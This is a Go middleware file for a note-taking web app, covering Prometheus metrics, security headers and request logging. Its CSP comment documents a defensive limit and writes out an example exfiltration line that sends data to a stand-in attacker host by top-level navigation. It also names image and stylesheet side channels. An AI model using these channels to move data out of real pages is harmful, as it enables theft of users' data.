// Package middleware provides HTTP middleware for logging and metrics.
package middleware

import (
	"log/slog"
	"net/http"
	"regexp"
	"strconv"
	"time"

	"github.com/danpicton/crapnote/internal/auth"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promauto"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

// responseWriter wraps http.ResponseWriter to capture the response status code.
type responseWriter struct {
	http.ResponseWriter
	status int
}

func wrapResponseWriter(w http.ResponseWriter) *responseWriter {
	return &responseWriter{ResponseWriter: w, status: http.StatusOK}
}

func (rw *responseWriter) WriteHeader(status int) {
	rw.status = status
	rw.ResponseWriter.WriteHeader(status)
}

// idSegment matches any all-digit path segment so metrics labels stay low-cardinality.
var idSegment = regexp.MustCompile(`/\d+`)

func normalizePath(path string) string {
	return idSegment.ReplaceAllString(path, "/{id}")
}

// ── Prometheus metrics ────────────────────────────────────────────────────────

var (
	httpRequestsTotal = promauto.NewCounterVec(prometheus.CounterOpts{
		Namespace: "crapnote",
		Name:      "http_requests_total",
		Help:      "Total HTTP requests by method, normalised path, and status code.",
	}, []string{"method", "path", "status"})

	httpRequestDuration = promauto.NewHistogramVec(prometheus.HistogramOpts{
		Namespace: "crapnote",
		Name:      "http_request_duration_seconds",
		Help:      "HTTP request latency in seconds.",
		Buckets:   []float64{.005, .01, .025, .05, .1, .25, .5, 1, 2.5, 5},
	}, []string{"method", "path", "status"})
)

// Metrics returns middleware that records Prometheus counters and histograms for
// every request.  The /metrics endpoint itself is excluded to avoid noise.
func Metrics() func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/metrics" {
				next.ServeHTTP(w, r)
				return
			}
			start := time.Now()
			rw := wrapResponseWriter(w)
			next.ServeHTTP(rw, r)

			path := normalizePath(r.URL.Path)
			status := strconv.Itoa(rw.status)
			dur := time.Since(start).Seconds()
			httpRequestsTotal.WithLabelValues(r.Method, path, status).Inc()
			httpRequestDuration.WithLabelValues(r.Method, path, status).Observe(dur)
		})
	}
}

// MetricsHandler returns the Prometheus /metrics HTTP handler.
func MetricsHandler() http.Handler {
	return promhttp.Handler()
}

// ── Security headers ──────────────────────────────────────────────────────────

// contentSecurityPolicy is the Content-Security-Policy sent with every response
// (issues #45, #90). It carries a single directive, and that is deliberate: the
// app is governed by two policies, and this one owns only what the other half
// cannot express.
//
// The other half is emitted by the frontend build. SvelteKit's kit.csp in
// frontend/svelte.config.js runs in mode:"hash", computing the SHA-256 of the
// inline bootstrap it generates and writing the resulting policy into
// index.html as <meta http-equiv="content-security-policy"> — adapter-static
// produces files, not a server, so meta is its only channel. That is what lets
// script-src drop 'unsafe-inline': the bootstrap embeds a per-build random
// global and the content-hashed chunk names, so its hash changes on every
// build and only the build itself can name it. It carries default-src,
// script-src, style-src, font-src, img-src, connect-src, object-src, base-uri
// and form-action.
//
// frame-ancestors is ignored inside a meta tag, so it has to be a header, and
// that is what is left here. docs/csp.md records the full split, why each
// directive sits where it does, and which file to edit for a given change.
//
// Do not "restore" the resource directives here for defence in depth. A browser
// enforces both policies at once and a resource must satisfy each, so an added
// directive can only intersect — and this header cannot know the bootstrap's
// hash, so script-src 'self' (or a default-src standing in for it) would block
// the bootstrap and leave the SPA silently unbootable, which is exactly the
// trap that forced 'unsafe-inline' in the first place.
//
// What the built policy still does not do, stated plainly so nobody builds on
// it: it is not an exfiltration barrier. CSP has no directive governing
// top-level navigation — navigate-to was dropped from the spec and never
// shipped — so script that does execute can always do
// location = "https://attacker.example/?d=" + data. Two narrower channels are
// open as well: img-src permits any https: origin, and the allowlisted
// https://fonts.googleapis.com in style-src can carry a payload in a stylesheet
// URL. With script-src hashed, the value of the policy is now that injected
// script does not run at all, rather than merely that it cannot phone home
// through fetch or a form post.
const contentSecurityPolicy = "frame-ancestors 'none'"

// SecurityHeaders returns middleware that sets security-related response headers
// on every response to defend against common browser-based attacks.
func SecurityHeaders() func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
			// Mounted globally, so API JSON responses carry the policy too.
			// Harmless — a JSON body loads no subresources — and it keeps this
			// middleware from having to sniff paths to tell SPA from API.
			w.Header().Set("Content-Security-Policy", contentSecurityPolicy)
			next.ServeHTTP(w, r)
		})
	}
}

// ── Structured request logging ────────────────────────────────────────────────

// Logging returns middleware that emits a structured log line for every request
// using the provided slog.Logger.  The user_id is included when the request is
// authenticated.
func Logging(logger *slog.Logger) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			start := time.Now()
			rw := wrapResponseWriter(w)
			next.ServeHTTP(rw, r)

			attrs := []any{
				"method", r.Method,
				"path", r.URL.Path,
				"status", rw.status,
				"duration_ms", time.Since(start).Milliseconds(),
			}
			if u := auth.UserFromContext(r.Context()); u != nil {
				attrs = append(attrs, "user_id", u.ID)
			}
			logger.Info("request", attrs...)
		})
	}
}
